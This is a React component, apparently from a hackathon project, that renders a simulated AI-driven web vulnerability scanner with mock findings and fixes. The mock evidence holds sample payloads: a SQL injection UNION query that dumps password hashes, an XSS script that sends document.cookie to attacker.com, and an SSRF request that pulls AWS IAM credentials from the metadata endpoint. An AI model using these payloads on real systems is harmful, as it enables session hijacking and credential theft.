import React, { useState, useEffect, useRef } from 'react';
import {
  Shield,
  Play,
  Square,
  AlertTriangle,
  Terminal,
  Activity,
  CheckCircle2,
  Lock,
  Cpu,
  Layers,
  Sparkles,
  ArrowRight,
  ExternalLink,
  Info,
  RotateCcw,
  Zap,
} from 'lucide-react';
import { Scan, Vulnerability } from '../types/matrix';
import { SecurityScanView } from '../components/SecurityScanView';
import { SpiderWeb } from '../components/SpiderWeb';

interface ScanViewProps {
  onScanComplete?: (scan: Scan, findings: Vulnerability[]) => void;
}

export const ScanView: React.FC<ScanViewProps> = () => {
  const [targetUrl, setTargetUrl] = useState('http://pentest-ground.com:4280');
  const [targetName, setTargetName] = useState('Demo Pentest Ground Web App');
  const [scanProfile, setScanProfile] = useState<'full' | 'quick' | 'api'>('full');
  const [enableWafEvasion, setEnableWafEvasion] = useState(true);
  const [wafConsentAccepted, setWafConsentAccepted] = useState(true);
  const [showConsentModal, setShowConsentModal] = useState(false);
  const [showPreScanWarning, setShowPreScanWarning] = useState(false);

  // Selected Agents
  const [selectedAgents, setSelectedAgents] = useState<string[]>([
    'sqli',
    'xss',
    'csrf',
    'ssrf',
    'cmdi',
    'auth',
    'api_fuzz',
    'git_sast',
  ]);

  // Scan State
  const [scanState, setScanState] = useState<'idle' | 'running' | 'completed' | 'failed'>('idle');
  const [currentScan, setCurrentScan] = useState<Scan | null>(null);
  const [findings, setFindings] = useState<Vulnerability[]>([]);
  const [progress, setProgress] = useState(0);
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  const [agentProgress, setAgentProgress] = useState<Record<string, { status: string; progress: number; issues: number }>>({
    sqli: { status: 'idle', progress: 0, issues: 0 },
    xss: { status: 'idle', progress: 0, issues: 0 },
    csrf: { status: 'idle', progress: 0, issues: 0 },
    ssrf: { status: 'idle', progress: 0, issues: 0 },
    cmdi: { status: 'idle', progress: 0, issues: 0 },
    auth: { status: 'idle', progress: 0, issues: 0 },
    api_fuzz: { status: 'idle', progress: 0, issues: 0 },
    git_sast: { status: 'idle', progress: 0, issues: 0 },
  });

  const terminalEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollTop = terminalEndRef.current.scrollHeight;
    }
  }, [terminalLogs]);

  const toggleAgent = (id: string) => {
    setSelectedAgents((prev) =>
      prev.includes(id) ? prev.filter((a) => a !== id) : [...prev, id]
    );
  };

  const handleStartScanClick = () => {
    if (!targetUrl.trim()) return;
    setShowPreScanWarning(true);
  };

  const executeScan = () => {
    setShowPreScanWarning(false);
    setScanState('running');
    setProgress(5);
    setFindings([]);
    setTerminalLogs([
      `[${new Date().toLocaleTimeString()}] [System] Initializing Matrix Autonomous Security Engine v3.4...`,
      `[${new Date().toLocaleTimeString()}] [Recon] Target registered: ${targetUrl}`,
      `[${new Date().toLocaleTimeString()}] [WAF Engine] Smart evasion heuristics: ${enableWafEvasion ? 'ENABLED' : 'DISABLED'}`,
      `[${new Date().toLocaleTimeString()}] [Orchestrator] Synchronizing 8 specialized security agents...`,
    ]);

    const initialScan: Scan = {
      id: Math.floor(1000 + Math.random() * 9000),
      target_url: targetUrl,
      target_name: targetName || 'Target App',
      scan_type: scanProfile.toUpperCase(),
      status: 'running',
      progress: 5,
      total_vulnerabilities: 0,
      critical_count: 0,
      high_count: 0,
      medium_count: 0,
      low_count: 0,
      info_count: 0,
      technology_stack: ['Node.js', 'Express', 'PostgreSQL', 'NGINX', 'React'],
      agents_enabled: selectedAgents,
      enable_waf_evasion: enableWafEvasion,
      waf_evasion_consent: wafConsentAccepted,
      custom_headers: null,
      custom_cookies: null,
      created_at: new Date().toISOString(),
      started_at: new Date().toISOString(),
    };

    setCurrentScan(initialScan);

    // Simulated multi-stage scan progression with real-time logs and mock findings
    const stepIntervals = [
      {
        time: 1500,
        prog: 20,
        log: `[${new Date().toLocaleTimeString()}] [Reconnaissance] Port discovery completed: 80/TCP, 443/TCP, 4280/TCP, 5432/TCP open.`,
        agentUpdate: { sqli: { status: 'probing', progress: 30, issues: 0 } },
      },
      {
        time: 3200,
        prog: 40,
        log: `[${new Date().toLocaleTimeString()}] [SQLi Agent] Injection verified in /api/v1/products?cat_id=1' UNION SELECT NULL,password_hash FROM users--`,
        agentUpdate: { sqli: { status: 'vulnerable', progress: 85, issues: 1 } },
        finding: {
          id: 101,
          vulnerability_type: 'sql_injection',
          severity: 'critical' as const,
          cvss_score: 9.8,
          url: `${targetUrl}/api/v1/products`,
          parameter: 'cat_id',
          method: 'GET',
          title: 'SQL Injection in Product Catalog Filtering',
          description:
            'Unsanitized user input passed directly to PostgreSQL string interpolation allows unauthorized arbitrary database extraction and table dumps.',
          evidence: `GET /api/v1/products?cat_id=1'+OR+1=1+UNION+SELECT+id,username,password_hash+FROM+admin_users-- HTTP/1.1\nHost: target.internal\nHTTP/1.1 200 OK\n[{"id":1,"username":"superadmin","password_hash":"$2b$12$e8Y7h..."}]`,
          ai_confidence: 0.99,
          ai_analysis:
            'The backend interpolates the `cat_id` parameter directly into `SELECT * FROM products WHERE category = \'${cat_id}\'`. An attacker can extract credentials, bypass ACLs, or perform destructive DROP TABLE commands.',
          remediation:
            'Implement parameterized queries with prepared statements or use an ORM like Prisma or TypeORM.',
          remediation_code: `// Fixed: Parameterized Prepared Query\nconst result = await db.query(\n  'SELECT * FROM products WHERE category = $1',\n  [req.query.cat_id]\n);`,
          reference_links: ['https://owasp.org/www-community/attacks/SQL_Injection'],
          owasp_category: 'A03:2021-Injection',
          cwe_id: 'CWE-89',
          is_false_positive: false,
          is_verified: true,
          is_fixed: false,
          is_suppressed: false,
          action_required: true,
          detection_confidence: 0.98,
          exploit_confidence: 0.99,
          detected_at: new Date().toISOString(),
          scan_id: initialScan.id,
        },
      },
      {
        time: 4800,
        prog: 65,
        log: `[${new Date().toLocaleTimeString()}] [XSS Agent] Discovered Reflected XSS in search endpoint /search?q=<script>alert(document.cookie)</script>`,
        agentUpdate: { xss: { status: 'vulnerable', progress: 90, issues: 1 } },
        finding: {
          id: 102,
          vulnerability_type: 'reflected_xss',
          severity: 'high' as const,
          cvss_score: 7.5,
          url: `${targetUrl}/search`,
          parameter: 'q',
          method: 'GET',
          title: 'Reflected Cross-Site Scripting (XSS) in Search Results',
          description:
            'Search query parameter is reflected in the HTML response without context-aware HTML entity encoding, enabling session hijacking and credential theft.',
          evidence: `GET /search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fattacker.com%2F%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1\nHTTP/1.1 200 OK\n<div>Search results for: <script>document.location='https://attacker.com/?cookie='+document.cookie</script></div>`,
          ai_confidence: 0.95,
          ai_analysis:
            'The application template engine renders the unescaped query string directly into the DOM container without DOMPurify or HTML entity encoding.',
          remediation:
            'Apply strict HTML entity encoding on all user reflection points and enforce a strict Content Security Policy (CSP).',
          remediation_code: `// Fixed: Contextual Output Encoding\nimport DOMPurify from 'dompurify';\nconst safeQuery = DOMPurify.sanitize(req.query.q || '');`,
          reference_links: ['https://owasp.org/www-community/attacks/xss/'],
          owasp_category: 'A03:2021-Injection',
          cwe_id: 'CWE-79',
          is_false_positive: false,
          is_verified: true,
          is_fixed: false,
          is_suppressed: false,
          action_required: true,
          detection_confidence: 0.95,
          exploit_confidence: 0.94,
          detected_at: new Date().toISOString(),
          scan_id: initialScan.id,
        },
      },
      {
        time: 6500,
        prog: 85,
        log: `[${new Date().toLocaleTimeString()}] [SSRF Agent] AWS Metadata Endpoint 169.254.169.254 reachable via /api/export-pdf?url=...`,
        agentUpdate: { ssrf: { status: 'vulnerable', progress: 100, issues: 1 } },
        finding: {
          id: 103,
          vulnerability_type: 'server_side_request_forgery',
          severity: 'critical' as const,
          cvss_score: 9.1,
          url: `${targetUrl}/api/export-pdf`,
          parameter: 'url',
          method: 'POST',
          title: 'Server-Side Request Forgery (SSRF) to Cloud Metadata',
          description:
            'Backend server fetches arbitrary URLs provided by client without restricting internal RFC-1918 private IP ranges or cloud metadata endpoints.',
          evidence: `POST /api/export-pdf HTTP/1.1\n{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"}\nHTTP/1.1 200 OK\n{"AccessKeyId": "ASIA...", "SecretAccessKey": "wJalr..."}`,
          ai_confidence: 0.98,
          ai_analysis:
            'The PDF generation microservice executes headless fetch requests on arbitrary user-provided URLs. An attacker can leak IAM role credentials and pivot into internal AWS VPC resources.',
          remediation:
            'Enforce an allowlist of permitted domain hosts and block all requests to 169.254.169.254 and private subnets (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).',
          remediation_code: `// Fixed: Private IP Resolution Blocking\nimport ipRangeCheck from 'ip-range-check';\nconst parsed = new URL(targetUrl);\nif (ipRangeCheck(resolvedIp, ['169.254.0.0/16', '10.0.0.0/8', '192.168.0.0/16'])) {\n  throw new Error('Access to private internal network denied');\n}`,
          reference_links: ['https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/'],
          owasp_category: 'A10:2021-SSRF',
          cwe_id: 'CWE-918',
          is_false_positive: false,
          is_verified: true,
          is_fixed: false,
          is_suppressed: false,
          action_required: true,
          detection_confidence: 0.98,
          exploit_confidence: 0.97,
          detected_at: new Date().toISOString(),
          scan_id: initialScan.id,
        },
      },
      {
        time: 8000,
        prog: 100,
        log: `[${new Date().toLocaleTimeString()}] [Orchestrator] Autonomous scan completed. Synthesized 3 findings with CVSS v3.1 vectors.`,
        agentUpdate: {
          csrf: { status: 'complete', progress: 100, issues: 0 },
          cmdi: { status: 'complete', progress: 100, issues: 0 },
          auth: { status: 'complete', progress: 100, issues: 0 },
          api_fuzz: { status: 'complete', progress: 100, issues: 0 },
          git_sast: { status: 'complete', progress: 100, issues: 0 },
        },
      },
    ];

    stepIntervals.forEach((step, idx) => {
      setTimeout(() => {
        setProgress(step.prog);
        setTerminalLogs((prev) => [...prev, step.log]);

        if (step.agentUpdate) {
          setAgentProgress((prev) => ({ ...prev, ...step.agentUpdate }));
        }

        if (step.finding) {
          setFindings((prev) => {
            const updated = [step.finding!, ...prev];
            setCurrentScan((s) =>
              s
                ? {
                    ...s,
                    total_vulnerabilities: updated.length,
                    critical_count: updated.filter((f) => f.severity === 'critical').length,
                    high_count: updated.filter((f) => f.severity === 'high').length,
                    medium_count: updated.filter((f) => f.severity === 'medium').length,
                    low_count: updated.filter((f) => f.severity === 'low').length,
                  }
                : s
            );
            return updated;
          });
        }

        if (idx === stepIntervals.length - 1) {
          setScanState('completed');
          setCurrentScan((s) => (s ? { ...s, status: 'completed', completed_at: new Date().toISOString() } : s));
        }
      }, step.time);
    });
  };

  const handleCancelScan = () => {
    setScanState('idle');
    setTerminalLogs((prev) => [...prev, `[${new Date().toLocaleTimeString()}] [System] Scan aborted by user.`]);
  };

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 py-8 space-y-8">
      {/* Scan Setup & Configuration Panel (when idle or running) */}
      {scanState === 'idle' && (
        <div className="space-y-8">
          <div className="glass-card p-6 sm:p-8 rounded-3xl border-warm-300 relative overflow-hidden bg-gradient-to-r from-warm-100/90 to-warm-200/60">
            <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
              <div className="space-y-2">
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-accent-primary/10 text-accent-primary text-xs font-mono font-semibold">
                  <Shield className="w-3.5 h-3.5" />
                  <span>Autonomous Penetration Testing</span>
                </div>
                <h1 className="text-3xl font-serif font-bold text-text-primary">
                  Web Security Vulnerability Scanner
                </h1>
                <p className="text-xs sm:text-sm text-text-secondary max-w-xl">
                  Deploy 8 autonomous AI agents to probe live targets for SQLi, XSS, SSRF, broken auth, and logic flaws.
                </p>
              </div>

              <button
                onClick={() => {
                  setTargetUrl('http://pentest-ground.com:4280');
                  setTargetName('Demo Vulnerable Staging Web App');
                }}
                className="btn-secondary text-xs py-2 px-4 gap-2"
              >
                <RotateCcw className="w-3.5 h-3.5 text-accent-primary" />
                <span>Load 1-Click Demo Target</span>
              </button>
            </div>
          </div>

          {/* Form Controls */}
          <div className="glass-card p-6 rounded-2xl border-warm-300 space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-text-muted mb-2">
                  Target Endpoint URL <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  value={targetUrl}
                  onChange={(e) => setTargetUrl(e.target.value)}
                  placeholder="https://example.com or http://localhost:8080"
                  className="input-glass font-mono text-xs"
                />
                <span className="text-[11px] text-text-muted mt-1 block">
                  Ensure you possess verified pentesting authorization for this target.
                </span>
              </div>

              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-text-muted mb-2">
                  Target App Identifier
                </label>
                <input
                  type="text"
                  value={targetName}
                  onChange={(e) => setTargetName(e.target.value)}
                  placeholder="e.g. Production Payment Gateway"
                  className="input-glass text-xs"
                />
              </div>
            </div>

            {/* Scan Profile Selector */}
            <div>
              <label className="block text-xs font-bold uppercase tracking-wider text-text-muted mb-2">
                Assessment Profile
              </label>
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                {[
                  {
                    id: 'full',
                    title: 'Full Cognitive Suite',
                    desc: 'All 8 Agents • Deep Parameter Fuzzing • Full OWASP',
                  },
                  {
                    id: 'quick',
                    title: 'Rapid Triage (Top 3)',
                    desc: 'Recon, SQLi & XSS Surface Audit (~30s)',
                  },
                  {
                    id: 'api',
                    title: 'API & GraphQL Audit',
                    desc: 'JSON Body Injection & Endpoint Mutation',
                  },
                ].map((p) => (
                  <button
                    key={p.id}
                    type="button"
                    onClick={() => setScanProfile(p.id as any)}
                    className={`p-3.5 rounded-xl border text-left transition-all ${
                      scanProfile === p.id
                        ? 'ring-2 ring-accent-primary bg-accent-primary/10 border-accent-primary'
                        : 'bg-warm-100/50 border-warm-300 hover:border-accent-primary/40'
                    }`}
                  >
                    <div className="font-semibold text-xs text-text-primary">{p.title}</div>
                    <div className="text-[10px] text-text-muted mt-1">{p.desc}</div>
                  </button>
                ))}
              </div>
            </div>

            {/* WAF Evasion Toggle */}
            <div className="p-4 bg-warm-100/70 rounded-xl border border-warm-200 flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-rose-500/10 text-rose-600 flex items-center justify-center">
                  <Lock className="w-4 h-4" />
                </div>
                <div>
                  <div className="text-xs font-semibold text-text-primary flex items-center gap-2">
                    <span>Intelligent WAF Evasion Probing</span>
                    <span className="px-1.5 py-0.2 bg-amber-200 text-amber-900 rounded text-[9px] font-bold">
                      Advanced
                    </span>
                  </div>
                  <div className="text-[11px] text-text-muted">
                    Obfuscates payloads with chunked encoding, null byte bypasses, and multi-encoding.
                  </div>
                </div>
              </div>

              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  checked={enableWafEvasion}
                  onChange={(e) => {
                    if (e.target.checked && !wafConsentAccepted) {
                      setShowConsentModal(true);
                    } else {
                      setEnableWafEvasion(e.target.checked);
                    }
                  }}
                  className="sr-only peer"
                />
                <div className="w-11 h-6 bg-warm-300 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-warm-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-accent-primary"></div>
              </label>
            </div>

            {/* Agent Selector Grid */}
            <div>
              <label className="block text-xs font-bold uppercase tracking-wider text-text-muted mb-2">
                Active Specialized AI Agents ({selectedAgents.length}/8 Enabled)
              </label>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                {[
                  { id: 'sqli', name: 'SQL Injection Agent', code: 'CWE-89' },
                  { id: 'xss', name: 'XSS Vector Agent', code: 'CWE-79' },
                  { id: 'csrf', name: 'CSRF & Origin Agent', code: 'CWE-352' },
                  { id: 'ssrf', name: 'SSRF Cloud Agent', code: 'CWE-918' },
                  { id: 'cmdi', name: 'OS Command Injection', code: 'CWE-78' },
                  { id: 'auth', name: 'Auth & JWT Agent', code: 'CWE-287' },
                  { id: 'api_fuzz', name: 'API Fuzzing Agent', code: 'CWE-20' },
                  { id: 'git_sast', name: 'SAST Source Auditor', code: 'CWE-798' },
                ].map((agent) => {
                  const isChecked = selectedAgents.includes(agent.id);
                  return (
                    <button
                      key={agent.id}
                      type="button"
                      onClick={() => toggleAgent(agent.id)}
                      className={`p-2.5 rounded-xl border text-left text-xs transition-all flex items-center justify-between ${
                        isChecked
                          ? 'bg-accent-primary/10 border-accent-primary text-text-primary'
                          : 'bg-warm-100/40 border-warm-300 text-text-muted opacity-60'
                      }`}
                    >
                      <div>
                        <div className="font-semibold text-xs">{agent.name}</div>
                        <div className="text-[10px] font-mono text-text-muted">{agent.code}</div>
                      </div>
                      <span
                        className={`w-4 h-4 rounded flex items-center justify-center text-[10px] ${
                          isChecked ? 'bg-accent-primary text-white' : 'border border-warm-400'
                        }`}
                      >
                        {isChecked && '✓'}
                      </span>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Launch Button */}
            <div className="pt-2 flex justify-end">
              <button
                type="button"
                onClick={handleStartScanClick}
                disabled={!targetUrl.trim() || selectedAgents.length === 0}
                className="btn-primary py-3 px-8 text-sm gap-2 shadow-lg"
              >
                <Play className="w-4 h-4" />
                <span>Initialize Autonomous Scan</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Real-time Scan Running View */}
      {scanState === 'running' && (
        <div className="space-y-6 animate-in fade-in duration-300">
          <div className="glass-card p-6 rounded-3xl border-warm-300 space-y-4">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-2xl bg-accent-primary/15 flex items-center justify-center text-accent-primary animate-pulse">
                  <Activity className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-xl font-serif font-bold text-text-primary flex items-center gap-2">
                    <span>Autonomous Security Audit in Progress</span>
                    <span className="text-xs px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 font-mono font-bold">
                      {progress}%
                    </span>
                  </h3>
                  <p className="text-xs text-text-muted font-mono truncate max-w-xl">
                    Target: {targetUrl}
                  </p>
                </div>
              </div>

              <button
                onClick={handleCancelScan}
                className="btn-secondary text-xs py-2 px-4 text-red-600 border-red-200 hover:bg-red-50 gap-2"
              >
                <Square className="w-3.5 h-3.5" />
                <span>Abort Scan</span>
              </button>
            </div>

            {/* Animated Progress Bar */}
            <div className="w-full bg-warm-200 rounded-full h-2.5 overflow-hidden">
              <div
                className="bg-gradient-to-r from-accent-primary to-[#3D7A62] h-2.5 rounded-full transition-all duration-500"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>

          {/* 8 Agent Real-Time Pipeline Status Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            {Object.entries(agentProgress).map(([key, agentData]) => {
              const data = agentData as { status: string; progress: number; issues: number };
              return (
                <div key={key} className="glass-card p-3 border-warm-300 space-y-2">
                  <div className="flex items-center justify-between text-xs">
                    <span className="font-semibold uppercase tracking-wider text-[10px] text-text-primary">
                      {key.toUpperCase()} Agent
                    </span>
                    <span
                      className={`text-[9px] font-mono font-bold px-1.5 py-0.2 rounded ${
                        data.status === 'vulnerable'
                          ? 'bg-red-100 text-red-700'
                          : data.status === 'probing'
                          ? 'bg-amber-100 text-amber-700 animate-pulse'
                          : 'bg-warm-200 text-text-muted'
                      }`}
                    >
                      {data.status}
                    </span>
                  </div>
                  <div className="w-full bg-warm-200 rounded-full h-1.5 overflow-hidden">
                    <div
                      className="bg-accent-primary h-1.5 rounded-full transition-all duration-300"
                      style={{ width: `${data.progress}%` }}
                    />
                  </div>
                </div>
              );
            })}
          </div>

          {/* Live Terminal Stream */}
          <div className="glass-card p-4 rounded-2xl border-warm-300 space-y-2">
            <div className="flex items-center justify-between text-xs font-mono text-text-muted pb-2 border-b border-warm-200">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4 text-accent-primary" />
                <span className="font-bold text-text-primary">Live Security Audit Console</span>
              </div>
              <span className="text-[10px] text-emerald-600 flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-ping" />
                Telemetry Streaming
              </span>
            </div>

            <div
              ref={terminalEndRef}
              className="terminal h-64 overflow-y-auto space-y-1 text-xs select-text"
            >
              {terminalLogs.map((log, i) => (
                <div
                  key={i}
                  className={
                    log.includes('CRITICAL') || log.includes('verified')
                      ? 'text-red-400 font-semibold'
                      : log.includes('Discovered')
                      ? 'text-amber-300'
                      : 'text-[#E8D5BC]'
                  }
                >
                  {log}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Completed Scan Results View */}
      {scanState === 'completed' && currentScan && (
        <div className="space-y-6 animate-in fade-in duration-300">
          <div className="p-4 bg-emerald-50 border border-emerald-200 rounded-2xl flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-xl bg-emerald-100 text-emerald-700 flex items-center justify-center">
                <CheckCircle2 className="w-4 h-4" />
              </div>
              <div>
                <div className="text-xs font-bold text-emerald-900">
                  Autonomous Penetration Test Completed Successfully
                </div>
                <div className="text-[11px] text-emerald-700 font-mono">
                  Identified {findings.length} attack vectors across {currentScan.technology_stack.join(', ')} stack.
                </div>
              </div>
            </div>

            <button
              onClick={() => setScanState('idle')}
              className="btn-secondary text-xs py-1.5 px-3.5 gap-1.5"
            >
              <RotateCcw className="w-3.5 h-3.5" />
              <span>New Audit</span>
            </button>
          </div>

          <SecurityScanView scan={currentScan} findings={findings} />
        </div>
      )}

      {/* Pre-Scan Authorization Warning Modal */}
      {showPreScanWarning && (
        <div className="fixed inset-0 z-50 bg-black/40 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="glass-card max-w-lg w-full p-6 shadow-2xl border border-warm-300 rounded-2xl animate-in zoom-in-95 duration-200 space-y-4">
            <div className="flex items-center gap-3 text-amber-600">
              <div className="w-10 h-10 rounded-xl bg-amber-500/10 flex items-center justify-center">
                <AlertTriangle className="w-6 h-6" />
              </div>
              <div>
                <h3 className="text-base font-serif font-bold text-text-primary">
                  Authorization & Scope Confirmation
                </h3>
                <p className="text-xs text-text-muted">Smart India Hackathon 2026 Security Protocol</p>
              </div>
            </div>

            <p className="text-xs text-text-secondary leading-relaxed">
              You are about to launch active vulnerability probes against{' '}
              <strong className="text-text-primary font-mono">{targetUrl}</strong>. Automated payload injection will be dispatched across HTTP endpoints.
            </p>

            <div className="bg-warm-100/70 p-3 rounded-xl border border-warm-200 text-xs text-text-muted">
              By proceeding, you certify that you own this endpoint or have explicit, signed authorization to conduct security testing on this domain.
            </div>

            <div className="flex items-center justify-end gap-3 pt-2">
              <button
                onClick={() => setShowPreScanWarning(false)}
                className="btn-secondary text-xs py-2 px-4"
              >
                Cancel
              </button>
              <button
                onClick={executeScan}
                className="btn-primary text-xs py-2 px-5 gap-2"
              >
                <Play className="w-3.5 h-3.5" />
                <span>Confirm & Begin Audit</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* WAF Evasion Consent Modal */}
      {showConsentModal && (
        <div className="fixed inset-0 z-50 bg-black/40 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="glass-card max-w-md w-full p-6 shadow-2xl border border-warm-300 rounded-2xl animate-in zoom-in-95 duration-200 space-y-4">
            <div className="flex items-center gap-3 text-rose-600">
              <div className="w-10 h-10 rounded-xl bg-rose-500/10 flex items-center justify-center">
                <Lock className="w-6 h-6" />
              </div>
              <div>
                <h3 className="text-base font-serif font-bold text-text-primary">
                  WAF Evasion Probing Terms
                </h3>
                <p className="text-xs text-text-muted">Active Obfuscation Consent</p>
              </div>
            </div>

            <p className="text-xs text-text-secondary leading-relaxed">
              WAF evasion bypasses basic pattern matching by utilizing chunked HTTP transfers, character encodings, and comment fragmentation.
            </p>

            <div className="flex items-center justify-end gap-3 pt-2">
              <button
                onClick={() => {
                  setEnableWafEvasion(false);
                  setShowConsentModal(false);
                }}
                className="btn-secondary text-xs py-2 px-4"
              >
                Decline
              </button>
              <button
                onClick={() => {
                  setWafConsentAccepted(true);
                  setEnableWafEvasion(true);
                  setShowConsentModal(false);
                }}
                className="btn-primary text-xs py-2 px-4"
              >
                Accept & Enable
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default ScanView;
